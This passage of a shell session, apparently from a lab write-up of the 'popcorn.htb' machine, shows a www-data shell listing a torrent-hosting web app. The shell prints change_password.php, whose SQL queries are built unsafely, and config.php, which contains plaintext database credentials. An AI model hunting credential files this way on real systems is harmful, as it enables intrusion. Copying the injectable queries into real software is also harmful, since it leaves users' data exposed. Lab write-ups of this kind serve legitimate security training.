<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cd</span> ../<br>$ <span class="hljs-built_in">ls</span> -la<br>total 196<br>drwxr-xr-x 15 www-data www-data  4096 Mar 17  2017 .<br>drwxr-xr-x  4 www-data www-data  4096 Apr 11  2017 ..<br>drwxr-xr-x  2 www-data www-data  4096 Jan 31  2010 PNG<br>drwxr-xr-x  4 www-data www-data  4096 Jun  3  2007 admin<br>-rw-r--r--  1 www-data www-data  1704 Jun  1  2007 browse.php<br>-rw-r--r--  1 www-data www-data  3042 Jun  3  2007 comment.php<br>-rw-r--r--  1 www-data www-data  6684 Nov 21 19:26 config.php<br>drwxr-xr-x  2 www-data www-data  4096 Jun  3  2007 css<br>drwxr-xr-x  2 www-data www-data  4096 Jun  3  2007 database<br>-rw-r--r--  1 www-data www-data   125 Jan 20  2007 download.php<br>-rw-r--r--  1 www-data www-data  1612 Jun  3  2007 edit.php<br>drwxr-xr-x  2 www-data www-data  4096 Jan 31  2010 health<br>-rw-r--r--  1 www-data www-data  3765 Mar  6  2005 hide.js<br>drwxr-xr-x  2 www-data www-data  4096 Jan 31  2010 images<br>-rw-r--r--  1 www-data www-data  1604 Jun  3  2007 index.php<br>drwxr-xr-x  2 www-data www-data  4096 Jun  3  2007 js<br>drwxr-xr-x  2 www-data www-data  4096 Jun  3  2007 lib<br>-rw-r--r--  1 www-data www-data  1825 Jan  9  2007 login.php<br>-rw-r--r--  1 www-data www-data   329 Dec 28  2006 logout.php<br>-rw-r--r--  1 www-data www-data 28104 Jan 27  2010 preview.gif<br>drwxr-xr-x  2 www-data www-data  4096 Jun  3  2007 readme<br>-rw-r--r--  1 www-data www-data  3307 Jun 10  2005 rss.php<br>-rw-r--r--  1 www-data www-data   573 Nov 29  2006 secure.php<br>-rw-r--r--  1 www-data www-data  6257 Mar  6  2005 sorttable.js<br>-rw-r--r--  1 www-data www-data   321 Nov 28  2006 stylesheet.css<br>drwxr-xr-x  3 www-data www-data  4096 Jun  3  2007 templates<br>-rw-r--r--  1 www-data www-data  4190 Dec 28  2006 thumbnail.php<br>drwxrwxrwx  2 www-data www-data  4096 Jan  2 15:44 torrents<br>-rw-r--r--  1 www-data www-data  7221 Jun  3  2007 torrents.php<br>-rw-r--r--  1 www-data www-data   539 Nov 30  2006 update_stats.php<br>-rw-r--r--  1 www-data www-data   986 Jun  3  2007 update_stats2.php<br>drwxrwxrwx  2 www-data www-data  4096 Jan  2 15:55 upload<br>-rw-r--r--  1 www-data www-data 15087 Mar 17  2017 upload.php<br>-rw-r--r--  1 www-data www-data  1467 Jun  3  2007 upload_file.php<br>drwxr-xr-x  3 www-data www-data  4096 Jan 31  2010 <span class="hljs-built_in">users</span><br>-rw-r--r--  1 www-data www-data  3548 Mar  6  2005 validator.php<br>$ <span class="hljs-built_in">cd</span> <span class="hljs-built_in">users</span>      <br>$ <span class="hljs-built_in">ls</span> -la<br>total 60<br>drwxr-xr-x  3 www-data www-data  4096 Jan 31  2010 .<br>drwxr-xr-x 15 www-data www-data  4096 Mar 17  2017 ..<br>-rw-r--r--  1 www-data www-data  2204 Mar  6  2005 change_password.php<br>-rw-r--r--  1 www-data www-data  1753 Mar  6  2005 change_settings.php<br>-rw-r--r--  1 www-data www-data   680 Mar  6  2005 change_settings_form.php<br>-rw-r--r--  1 www-data www-data  1555 Mar 11  2005 forgot_password.php<br>-rw-r--r--  1 www-data www-data   701 Jul  7  2006 img.jpg<br>-rw-r--r--  1 www-data www-data  6891 Jan 24  2007 index.php<br>-rw-r--r--  1 www-data www-data   822 Jul  7  2006 php_captcha.php<br>-rw-r--r--  1 www-data www-data  2287 Jan 24  2007 registration.php<br>drwxr-xr-x  2 www-data www-data  4096 Jun  3  2007 templates<br>-rw-r--r--  1 www-data www-data 11110 Mar  6  2005 validation_class.php<br>$ <span class="hljs-built_in">cat</span> change_password.php<br>&lt;?<br><br>include(<span class="hljs-string">&quot;../config.php&quot;</span>);<br>require_login();<br><br>/* form has been submitted, check <span class="hljs-keyword">if</span> it the user login information is correct */<br><span class="hljs-keyword">if</span> (match_referer() &amp;&amp; isset(<span class="hljs-variable">$_POST</span>)) &#123;<br>        <span class="hljs-variable">$frm</span> = <span class="hljs-variable">$_POST</span>;<br>        <span class="hljs-variable">$errormsg</span> = validate_form(<span class="hljs-variable">$frm</span>, <span class="hljs-variable">$errors</span>);<br><br>        <span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$errormsg</span>)) &#123;<br>                update_password(<span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;newpassword&quot;</span>]);<br>                <span class="hljs-variable">$noticemsg</span> = <span class="hljs-string">&quot;Password change successful&quot;</span>;<br>        &#125;<br>&#125;<br><br><span class="hljs-variable">$DOC_TITLE</span> = <span class="hljs-string">&quot;Change Password&quot;</span>;<br>include(<span class="hljs-string">&quot;<span class="hljs-variable">$CFG</span>-&gt;templatedir/header.php&quot;</span>);<br>include(<span class="hljs-string">&quot;<span class="hljs-variable">$CFG</span>-&gt;templatedir/form_header.php&quot;</span>);<br>include(<span class="hljs-string">&quot;templates/change_password_form.php&quot;</span>);<br>include(<span class="hljs-string">&quot;<span class="hljs-variable">$CFG</span>-&gt;templatedir/footer.php&quot;</span>);<br><br>/******************************************************************************<br> * FUNCTIONS<br> *****************************************************************************/<br><br><span class="hljs-keyword">function</span> validate_form(&amp;<span class="hljs-variable">$frm</span>, &amp;<span class="hljs-variable">$errors</span>) &#123;<br>/* validate the forgot password form, and <span class="hljs-built_in">return</span> the error messages <span class="hljs-keyword">in</span> a string.<br> * <span class="hljs-keyword">if</span> the string is empty, <span class="hljs-keyword">then</span> there are no errors */<br><br>        <span class="hljs-variable">$errors</span> = new Object;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>        <span class="hljs-keyword">if</span> (empty(<span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;oldpassword&quot;</span>])) &#123;<br>                <span class="hljs-variable">$errors</span>-&gt;oldpassword = <span class="hljs-literal">true</span>;<br>                <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;You did not specify your old password&quot;</span>;<br><br>        &#125; elseif (! password_valid(<span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;oldpassword&quot;</span>])) &#123;<br>                <span class="hljs-variable">$errors</span>-&gt;oldpassword = <span class="hljs-literal">true</span>;<br>                <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;Your old password is invalid&quot;</span>;<br><br>        &#125; elseif (empty(<span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;newpassword&quot;</span>])) &#123;<br>                <span class="hljs-variable">$errors</span>-&gt;newpassword = <span class="hljs-literal">true</span>;<br>                <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;You did not specify your new password&quot;</span>;<br><br>        &#125; elseif (empty(<span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;newpassword2&quot;</span>])) &#123;<br>                <span class="hljs-variable">$errors</span>-&gt;newpassword2 = <span class="hljs-literal">true</span>;<br>                <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;You did not confirm your new password&quot;</span>;<br><br>        &#125; elseif (<span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;newpassword&quot;</span>] != <span class="hljs-variable">$frm</span>[<span class="hljs-string">&quot;newpassword2&quot;</span>]) &#123;<br>                <span class="hljs-variable">$errors</span>-&gt;newpassword = <span class="hljs-literal">true</span>;<br>                <span class="hljs-variable">$errors</span>-&gt;newpassword2 = <span class="hljs-literal">true</span>;<br>                <span class="hljs-variable">$msg</span> .= <span class="hljs-string">&quot;Your new passwords do not match&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$msg</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> password_valid(<span class="hljs-variable">$password</span>) &#123;<br>/* <span class="hljs-built_in">return</span> <span class="hljs-literal">true</span> <span class="hljs-keyword">if</span> the user<span class="hljs-string">&#x27;s password is valid */</span><br><span class="hljs-string"></span><br><span class="hljs-string">        global $_SESSION;</span><br><span class="hljs-string"></span><br><span class="hljs-string">        $username = $_SESSION[&quot;userName&quot;];</span><br><span class="hljs-string">        $password = md5($password);</span><br><span class="hljs-string"></span><br><span class="hljs-string">        $qid = db_query(&quot;SELECT 1 FROM users WHERE username = &#x27;</span><span class="hljs-variable">$username</span><span class="hljs-string">&#x27; AND password = &#x27;</span><span class="hljs-variable">$password</span><span class="hljs-string">&#x27;&quot;);</span><br><span class="hljs-string">        return db_num_rows($qid);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function update_password($newpassword) &#123;</span><br><span class="hljs-string">/* set the user&#x27;</span>s password to the new one */<br><br>        global <span class="hljs-variable">$_SESSION</span>;<br><br>        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&quot;userName&quot;</span>];<br>        <span class="hljs-variable">$newpassword</span> = md5(<span class="hljs-variable">$newpassword</span>);<br><br>        <span class="hljs-variable">$qid</span> = db_query(<span class="hljs-string">&quot;UPDATE users SET password = &#x27;<span class="hljs-variable">$newpassword</span>&#x27; WHERE username = &#x27;<span class="hljs-variable">$username</span>&#x27;&quot;</span>);<br>&#125;<br><br>?&gt;<br>$ <span class="hljs-built_in">cd</span> ../<br>$ <span class="hljs-built_in">cat</span> config.php<br>&lt;?php<br><br>  //rename this file to config.php<br>  /* turn on verbose error reporting (15) to see all warnings and errors */<br>  error_reporting(15);<br><br>//include <span class="hljs-string">&quot;forumdb.php&quot;</span>;<br><br>  //define a generic object to hold all the configuration variables<br>  class object &#123;&#125;;<br><br>  //declare an instance of the generic object<br>  <span class="hljs-variable">$CFG</span> = new object;<br>  //declare root directory<br>  <span class="hljs-variable">$CFG</span>-&gt;dirroot     = <span class="hljs-built_in">dirname</span>(__FILE__);<br><br>  //Edit This For TORRENT HOSTER Database<br>  //database configuration<br>  <span class="hljs-variable">$CFG</span>-&gt;host = <span class="hljs-string">&quot;localhost&quot;</span>;<br>  <span class="hljs-variable">$CFG</span>-&gt;dbName = <span class="hljs-string">&quot;torrenthoster&quot;</span>;       //db name<br>  <span class="hljs-variable">$CFG</span>-&gt;dbUserName = <span class="hljs-string">&quot;torrent&quot;</span>;    //db username<br>  <span class="hljs-variable">$CFG</span>-&gt;dbPassword = <span class="hljs-string">&quot;SuperSecret!!&quot;</span>;   //db password<br><br>        <span class="hljs-variable">$dbhost</span>         = <span class="hljs-variable">$CFG</span>-&gt;host;<br>        <span class="hljs-variable">$dbuser</span>         = <span class="hljs-variable">$CFG</span>-&gt;dbUserName;<br>        <span class="hljs-variable">$dbpass</span>         = <span class="hljs-variable">$CFG</span>-&gt;dbPassword;<br>        <span class="hljs-variable">$database</span>       = <span class="hljs-variable">$CFG</span>-&gt;dbName;<br><br> /* directory configuration, <span class="hljs-keyword">if</span> all your webtorrent.com files are <span class="hljs-keyword">in</span> one directory<br> * you probably only need to <span class="hljs-built_in">set</span> the wwwroot variable.  valid examples are:<br> *<br> * <span class="hljs-variable">$CFG</span>-&gt;wwwroot = <span class="hljs-string">&quot;http://myserver.com/webtorrent&quot;</span>;<br> * <span class="hljs-variable">$CFG</span>-&gt;wwwroot = <span class="hljs-string">&quot;http://localhost/webtorrent&quot;</span>;<br> * <span class="hljs-variable">$CFG</span>-&gt;wwwroot = <span class="hljs-string">&quot;http://myserver.com&quot;</span>;<br> *<br> * <span class="hljs-keyword">do</span> not include the trailing slash. dirroot is the physical path on your<br> * server <span class="hljs-built_in">where</span> the application can find it<span class="hljs-string">&#x27;s files. for more security, it is</span><br><span class="hljs-string"> * recommended that you move the libraries and templates ($CFG-&gt;libdir</span><br><span class="hljs-string"> * and $CFG-&gt;templatedir) outside of your web directories.</span><br><span class="hljs-string"> */</span><br><span class="hljs-string"></span><br><span class="hljs-string">  /* Edit below this */</span><br><span class="hljs-string"></span><br><span class="hljs-string">  $CFG-&gt;wwwroot  = &quot;http://popcorn.htb/torrent&quot;;  //full path to your website</span><br><span class="hljs-string">  $CFG-&gt;forumroot = &quot;http://www.myanmartorrents.com/phpbb&quot;;</span><br><span class="hljs-string">  $CFG-&gt;webname = &quot;Torrent Hoster&quot;;</span><br><span class="hljs-string">  $CFG-&gt;support     = &quot;webmaster@wmyanmartorrents.com&quot;;</span><br><span class="hljs-string">  $CFG-&gt;rssnum      = &quot;10&quot;; //number of rss to show</span><br><span class="hljs-string">  $CFG-&gt;mainnews        = &quot;10&quot;; //number of news on the main page, use 0 to not print news on main page</span><br><span class="hljs-string">  $CFG-&gt;maintorrents= &quot;30&quot;;//number of torrents in the main page</span><br><span class="hljs-string">  $CFG-&gt;torrents    = &quot;$CFG-&gt;dirroot/torrents&quot;; //torrent folder repect to your wwwroot</span><br><span class="hljs-string">  $CFG-&gt;usesub      = &quot;yes&quot;; //Do you want to use Subcategories? &quot;yes&quot; or &quot;no&quot;</span><br><span class="hljs-string">  //$CFG-&gt;usephpbb  = &quot;no&quot;; //put &quot;yes&quot; if you want to connect with phpbb users. &quot;yes&quot; or &quot;no&quot; &lt;&lt; DO NOT USE IT YET</span><br><span class="hljs-string">  $CFG-&gt;regdownload = &quot;yes&quot;; //only registered users can download torrents. &quot;yes&quot; or &quot;no&quot;</span><br><span class="hljs-string">  $CFG-&gt;regupload   = &quot;yes&quot;; //only registered users can upload torrents. &quot;yes&quot; or &quot;no&quot;</span><br><span class="hljs-string">  /*</span><br><span class="hljs-string">      no to change below this (i think)</span><br><span class="hljs-string">  */</span><br><span class="hljs-string"></span><br><span class="hljs-string">  $CFG-&gt;templatedir = &quot;$CFG-&gt;dirroot/templates&quot;;</span><br><span class="hljs-string">  $CFG-&gt;libdir      = &quot;$CFG-&gt;dirroot/lib&quot;;</span><br><span class="hljs-string">  $CFG-&gt;imagedir    = &quot;$CFG-&gt;wwwroot/images&quot;;</span><br><span class="hljs-string">  $CFG-&gt;health      = &quot;$CFG-&gt;wwwroot/health&quot;;</span><br><span class="hljs-string">  $CFG-&gt;icondir     = &quot;$CFG-&gt;imagedir/icons&quot;;</span><br><span class="hljs-string">  $CFG-&gt;version     = &quot;2.0&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  //$CFG-&gt;sessionname = &quot;mtc&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  /* define database error handling behavior, since we are in development stages</span><br><span class="hljs-string">  * we will turn on all the debugging messages to help us troubleshoot */</span><br><span class="hljs-string">  $DB_DEBUG = true;</span><br><span class="hljs-string">  $DB_DIE_ON_FAIL = true;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  //start session to hold username and password when linking from page to page</span><br><span class="hljs-string">  session_start();</span><br><span class="hljs-string">  header(&quot;Cache-control: private&quot;); // IE 6 Bug Fix.</span><br><span class="hljs-string"></span><br><span class="hljs-string">  //load up libraries</span><br><span class="hljs-string">  require &quot;lib/dblib.php&quot;;</span><br><span class="hljs-string">  require &quot;lib/stdlib.php&quot;;</span><br><span class="hljs-string">  require &quot;lib/webtorrent.php&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  /* setup some global variables */</span><br><span class="hljs-string">  $ME = qualified_me();</span><br><span class="hljs-string"></span><br><span class="hljs-string">  /* connect to the database */</span><br><span class="hljs-string">  db_connect($CFG-&gt;host, $CFG-&gt;dbName, $CFG-&gt;dbUserName, $CFG-&gt;dbPassword);</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">        Print out header</span><br><span class="hljs-string">  *******************************************/</span><br><span class="hljs-string">  function stheader($title)</span><br><span class="hljs-string">  &#123;</span><br><span class="hljs-string">  //global $time_begin;</span><br><span class="hljs-string">  //$time_begin = get_micro_time();</span><br><span class="hljs-string"></span><br><span class="hljs-string">  //global $sitename;</span><br><span class="hljs-string">  echo &#x27;</span>&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;<br>  &lt;html&gt;<br>  &lt;<span class="hljs-built_in">head</span>&gt;<br>  &lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html; charset=iso-8859-1&quot;</span> /&gt;<br>  &lt;<span class="hljs-built_in">link</span> rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;stylesheet.css&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> /&gt;<br>  &lt;title&gt;T-Xore : <span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">  //echo htmlentities($title);</span><br><span class="hljs-string"></span><br><span class="hljs-string">echo &#x27;</span>&lt;/title&gt;<br>&lt;/head&gt;&lt;body&gt;<br>&lt;script <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> src=<span class="hljs-string">&quot;dyn.js&quot;</span>&gt;&lt;/script&gt;<br><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">// Get microtime</span><br><span class="hljs-string">function get_micro_time()</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">  list($usec, $sec) = explode(&#x27;</span> <span class="hljs-string">&#x27;, microtime());</span><br><span class="hljs-string">  return ((float)$usec + (float)$sec);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function connect_forum($fdbhost, $fdbuser, $fdbpass, $fdatabase)</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">$errormes = &#x27;</span>The sql server has encountered a problem, we are trying to fix it as soon as possible<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">@$connection = mysql_connect($fdbhost, $fdbuser, $fdbpass);</span><br><span class="hljs-string">@mysql_select_db($fdatabase) or die($errormes);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">function torsize ($size)</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">if ($size &gt;= 1099511627776)     &#123;$size = round($size / 1024 / 1024 / 1024 / 1024, 2).&#x27;</span> TB<span class="hljs-string">&#x27;;&#125;</span><br><span class="hljs-string">elseif ($size &gt;= 1073741824)    &#123;$size = round($size / 1024 / 1024 / 1024, 2).&#x27;</span> GB<span class="hljs-string">&#x27;;&#125;</span><br><span class="hljs-string">elseif ($size &gt;= 1048576)               &#123;$size = round($size / 1024 / 1024, 2).&#x27;</span> MB<span class="hljs-string">&#x27;;&#125;</span><br><span class="hljs-string">elseif ($size &gt;= 1024)                  &#123;$size = round($size / 1024, 2).&#x27;</span> KB<span class="hljs-string">&#x27;;&#125;</span><br><span class="hljs-string">else                                                    &#123;$size = $size.&#x27;</span> Byte<span class="hljs-string">&#x27;;&#125;</span><br><span class="hljs-string">return $size;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* show files contained in a torrent */</span><br><span class="hljs-string">function showfiles($hash)</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">$filename2 = $hash;</span><br><span class="hljs-string">//global $CFG-&gt;torrents;</span><br><span class="hljs-string">include_once(&quot;lib/BDecode.php&quot;) ;</span><br><span class="hljs-string">include_once(&quot;lib/BEncode.php&quot;) ;</span><br><span class="hljs-string">include_once(&quot;config.php&quot;) ;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$filename = &quot;torrents/$filename2.btf&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$stream = @file_get_contents(&quot;$filename&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">if ($stream == FALSE)</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">echo &#x27;</span>No details availiable... 1 <span class="hljs-string">&#x27;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">if(!isset($stream))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">echo &#x27;</span>No details availiable... 2 <span class="hljs-string">&#x27;;</span><br><span class="hljs-string">break;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$array = BDecode($stream);</span><br><span class="hljs-string">if ($array === FALSE)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">echo &#x27;</span>No details availiable... 3 <span class="hljs-string">&#x27;;</span><br><span class="hljs-string">break;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">if(array_key_exists(&quot;info&quot;, $array) === FALSE)&#123;</span><br><span class="hljs-string">echo &#x27;</span>No details availiable... 4 <span class="hljs-string">&#x27;;</span><br><span class="hljs-string">break;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">$infovariable = $array[&quot;info&quot;];</span><br><span class="hljs-string">if (isset($infovariable[&quot;files&quot;]))</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$filecount = &quot;&quot;;</span><br><span class="hljs-string">foreach ($infovariable[&quot;files&quot;] as $file)</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$row_color = ($row_count % 2) ? $color1 : $color2;</span><br><span class="hljs-string"></span><br><span class="hljs-string">$filecount += &quot;1&quot;;</span><br><span class="hljs-string">$multiname = 